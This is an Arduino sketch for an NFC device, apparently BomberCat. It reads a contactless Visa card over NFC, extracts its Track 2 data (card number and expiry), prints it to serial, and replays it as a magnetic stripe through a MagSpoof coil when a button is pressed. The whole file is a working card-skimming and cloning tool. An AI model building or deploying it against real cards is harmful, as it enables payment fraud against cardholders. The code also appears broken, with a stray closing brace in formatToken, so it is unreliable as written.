#include <Wire.h>
#include "Electroniccats_PN7150.h"

// Definition of constants and pins
#define PN7150_IRQ   (11) // Interrupt Request pin
#define PN7150_VEN   (13) // Enable pin
#define PN7150_ADDR  (0x28) // I2C address

#define L1 (LED_BUILTIN) // Built-in LED pin
#define PIN_A (6) // MagSpoof pin output A
#define PIN_B (7) // MagSpoof pin output B

#define NPIN (5)  // NFC Button pin
#define CLOCK_US (500) // Clock duration in microseconds
#define BETWEEN_ZERO (53) // Number of zeros between track 1 and 2

// Declaration of objects and global variables
Electroniccats_PN7150 nfc(PN7150_IRQ, PN7150_VEN, PN7150_ADDR);

char token[19]; // Buffer to hold token data
String tokenString = ""; // Token data as string

uint8_t ppdol[255] = {0x80, 0xA8, 0x00, 0x00, 0x02, 0x83, 0x00}; // Processing options data object list
char revTrack[41]; // Buffer to hold reversed track data
const int sublen[] = {32, 48, 48}; // Subtraction lengths for track data
const int bitlen[] = {7, 5, 5}; // Bit lengths for track data
int dir = 0; // Direction flag

// Auxiliary functions

// Blink an LED
void blink(int pin, int msdelay, int times) {
  for (int i = 0; i < times; i++) {
    digitalWrite(pin, HIGH);
    delay(msdelay);
    digitalWrite(pin, LOW);
    delay(msdelay);
  }
}

// Process the PDOL (Processing options data object list)
uint8_t treatPDOL(uint8_t* apdu) { 
  uint8_t plen = 7;
  for (uint8_t i = 1; i <= apdu[0]; i++) {
    if (apdu[i] == 0x9F && apdu[i + 1] == 0x66) {
      ppdol[plen] = 0xF6;
      ppdol[plen + 1] = 0x20;
      ppdol[plen + 2] = 0xC0;
      ppdol[plen + 3] = 0x00;
      plen += 4;
      i += 2;
    } else if (apdu[i] == 0x9F && apdu[i + 1] == 0x1A) {
      ppdol[plen] = 0x9F;
      ppdol[plen + 1] = 0x1A;
      plen += 2;
      i += 2;
    } else if (apdu[i] == 0x5F && apdu[i + 1] == 0x2A) {
      ppdol[plen] = 0x5F;
      ppdol[plen + 1] = 0x2A;
      plen += 2;
      i += 2;
    } else if (apdu[i] == 0x9A) {
      ppdol[plen] = 0x9A;
      ppdol[plen + 1] = 0x9A;
      ppdol[plen + 2] = 0x9A;
      plen += 3;
      i += 1;
    } else if (apdu[i] == 0x95) {
      ppdol[plen] = 0x95;
      ppdol[plen + 1] = 0x95;
      ppdol[plen + 2] = 0x95;
      ppdol[plen + 3] = 0x95;
      ppdol[plen + 4] = 0x95;
      plen += 5;
      i += 1;
    } else if (apdu[i] == 0x9C) {
      ppdol[plen] = 0x9C;
      plen += 1;
      i += 1;
    } else if (apdu[i] == 0x9F && apdu[i + 1] == 0x37) {
      ppdol[plen] = 0x9F;
      ppdol[plen + 1] = 0x37;
      ppdol[plen + 2] = 0x9F;
      ppdol[plen + 3] = 0x37;
      plen += 4;
      i += 2;
    } else {
      uint8_t u = apdu[i + 2];
      while (u > 0) {
        ppdol[plen] = 0;
        plen += 1;
        u--;
      }
      i += 2;
    }
  }
  ppdol[4] = (plen + 2) - 7; // Length of PDOL + 2
  ppdol[6] = plen - 7;       // Actual length
  plen++;                    // +1 due to the last 0
  ppdol[plen] = 0x00;        // Add the last 0 to the challenge
  return plen;
}

// Main Logic Functions

// Seek track 2 data on the card
void seekTrack2() {
  bool chktoken = false;
  uint8_t apdubuffer[255] = {}, apdulen;

  uint8_t ppse[] = {0x00, 0xA4, 0x04, 0x00, 0x0e, 0x32, 0x50, 0x41, 0x59, 0x2e, 0x53, 0x59, 0x53, 0x2e, 0x44, 0x44, 0x46, 0x30, 0x31, 0x00}; // PPSE command
  uint8_t visa[] = {0x00, 0xA4, 0x04, 0x00, 0x07, 0xa0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, 0x00}; // Visa AID command
  uint8_t processing[] = {0x80, 0xA8, 0x00, 0x00, 0x02, 0x83, 0x00, 0x00}; // Processing command
  uint8_t sfi[] = {0x00, 0xb2, 0x01, 0x0c, 0x00}; // Read SFI command

  uint8_t *apdus[] = {ppse, visa, processing, sfi};
  uint8_t apdusLen[] = {sizeof(ppse), sizeof(visa), sizeof(processing), sizeof(sfi)};

  uint8_t pdol[50], plen = 8;

  for (uint8_t i = 0; i < 4; i++) {
    if (nfc.readerTagCmd(apdus[i], apdusLen[i], &apdubuffer[0], &apdulen)) {

      for (uint8_t u = 0; u < apdulen; u++) {
        if (i == 1 && apdubuffer[u] == 0x9F && apdubuffer[u + 1] == 0x38) {

          for (uint8_t e = 0; e <= apdubuffer[u + 2]; e++)
            pdol[e] = apdubuffer[u + e + 2];
          plen = treatPDOL(pdol);
          apdus[2] = ppdol;
          apdusLen[2] = plen;

        } else if (i == 3 && apdubuffer[u] == 0x57 && apdubuffer[u + 1] == 0x13 && !chktoken) {
          chktoken = true;
          memcpy(&token, &apdubuffer[u + 2], 19);
          break;
        }
      }
    } else {
      Serial.println("Error reading the card!");
    }
  }
  if (chktoken) {
    formatToken();
  } else {
    Serial.println("Could not find the track 2!");
  }  
  digitalWrite(L1, LOW);
  Serial.println();
  Serial.println("Reinitializing");
  Serial.println("Waiting for a card...");
  nfc.stopDiscovery();
  nfc.startDiscovery();
}

// Format the token data
void formatToken() { 
  uint8_t i2 = 0;
  for (int i = 0; i <= sizeof(token) * 2; i++) {
    switch(i) {
      case 0:
        tokenString = String(';');
        break;
      case 17:
        tokenString += String('=');
        break;
      case 38:
        tokenString += String('?');
        break;
      default:
        if (i % 2)
          tokenString += String(token[i2] / 0x10);
        else {
          tokenString += String(token[i2] % 0x10);
          i2 += 1;
        }
        break;
    }
  }
  }
  if (tokenString.length() > 0) {
    Serial.print("Token obtained and formatted: ");
    Serial.println(tokenString);
  }
}

// Play a single bit for the magnetic stripe emulation
void playBit(int sendBit) {
  dir ^= 1;
  digitalWrite(PIN_A, dir);
  digitalWrite(PIN_B, !dir);
  delayMicroseconds(CLOCK_US);

  if (sendBit) {
    dir ^= 1;
    digitalWrite(PIN_A, dir);
    digitalWrite(PIN_B, !dir);
  }
  delayMicroseconds(CLOCK_US);
}

// Play the magnetic track data
void playTrack(int track) {
  int tmp, crc, lrc = 0;
  dir = 0;
  track--; // index 0

  // Put first a bunch of initial zeros.
  for (int i = 0; i < 25; i++) {
    playBit(0);
  }

  for (int i = 0; tokenString.length() && i < tokenString.length(); i++) {
    crc = 1;
    tmp = tokenString[i];
    tmp -= sublen[track];

    for (int j = 0; j < bitlen[track] - 1; j++) {
      crc ^= tmp & 1;
      lrc ^= (tmp & 1) << j;
      playBit(tmp & 1);
      tmp >>= 1;
    }
    playBit(crc);
  }

  // Finish calculating and send the last "byte" (LRC)
  tmp = lrc;
  crc = 1;
  for (int j = 0; j < bitlen[track] - 1; j++) {
    crc ^= tmp & 1;
    playBit(tmp & 1);
    tmp >>= 1;
  }
  playBit(crc);

  // If it's track 1, play the second track in reverse (as if it was passing backward)
  if (track == 0) {
    for (int i = 0; i < BETWEEN_ZERO; i++) {
      playBit(0);
    }

    reverseTrack(2);
  }

  // Finish with zeros
  for (int i = 0; i < 5 * 5; i++) {
    playBit(0);
  }

  digitalWrite(PIN_A, LOW);
  digitalWrite(PIN_B, LOW);
}

// Reverse the magnetic track data for track 2
void reverseTrack(int track) {
  int i = 0;
  track--; // index 0
  dir = 0;

  while (revTrack[i++] != '\0');
  i--;
  while (i--)
    for (int j = bitlen[track] - 1; j >= 0; j--)
      playBit((revTrack[i] >> j) & 1);
}

// Store reversed track data
void storeRevTrack(int track) {
  int i, tmp, crc, lrc = 0;
  track--; // index 0
  dir = 0;

  for (i = 0; tokenString[i] != '\0'; i++) {
    crc = 1;
    tmp = tokenString[i] - sublen[track];

    for (int j = 0; j < bitlen[track] - 1; j++) {
      crc ^= tmp & 1;
      lrc ^= (tmp & 1) << j;
      tmp & 1 ? (revTrack[i] |= 1 << j) : (revTrack[i] &= ~(1 << j));
      tmp >>= 1;
    }
    crc ? (revTrack[i] |= 1 << 4) : (revTrack[i] &= ~(1 << 4));
  }

  // Finish calculating and send the last "byte" (LRC)
  tmp = lrc;
  crc = 1;
  for (int j = 0; j < bitlen[track] - 1; j++) {
    crc ^= tmp & 1;
    tmp & 1 ? (revTrack[i] |= 1 << j) : (revTrack[i] &= ~(1 << j));
    tmp >>= 1;
  }
  crc ? (revTrack[i] |= 1 << 4) : (revTrack[i] &= ~(1 << 4));

  i++;
  revTrack[i] = '\0';
}

// Setup and Main Loop Functions

// Setup function to initialize the system
void setup() {
  pinMode(PIN_A, OUTPUT);
  pinMode(PIN_B, OUTPUT);
  pinMode(L1, OUTPUT);
  pinMode(NPIN, INPUT_PULLUP);

  Serial.begin(9600);
  while (!Serial);

  Serial.println("Initializing...");  
  if (nfc.connectNCI()) {
    Serial.println("Error: Could not initialize PN7150!");
    while (1);
  }

  Serial.println("BomberCat initialized successfully!");
  Serial.println("Waiting for a card...");

  // Blink LEDs to show initialization
  blink(L1, 200, 6); 
}

// Main loop function to continuously check for NFC cards and handle button presses
void loop() {
  // Automatically read NFC cards
  if (nfcread()) {
  }

  // Activate MagSpoof when button is pressed
  if (digitalRead(NPIN) == 0) {
    if (token[0] != 0x0) { // Check if there is data in the token
      blink(L1, 150, 7); // Indicate MagSpoof activation
      Serial.println("Activating MagSpoof...");
      playTrack(2); // Emulate magnetic track
      blink(L1, 100, 3); // Indicate end of process
    } else {
      blink(L1, 500, 1);
      blink(L1, 500, 1);
      Serial.println("Error: No data available for MagSpoof!");

      nfc.stopDiscovery();
      Serial.println();
      Serial.println("Reinitialazing...");
      nfc.startDiscovery();
      Serial.print("Waiting for a card...");
    }
    delay(400);
  }
}

// Function to read NFC cards
bool nfcread() {
  nfc.startDiscovery();
  bool success = nfc.isTagDetected(500);
  if (success) {
    Serial.println();
    Serial.println("Reading card...");
    digitalWrite(L1, HIGH); // Turn on LED during NFC reading
    seekTrack2();
  }
  return success;
}
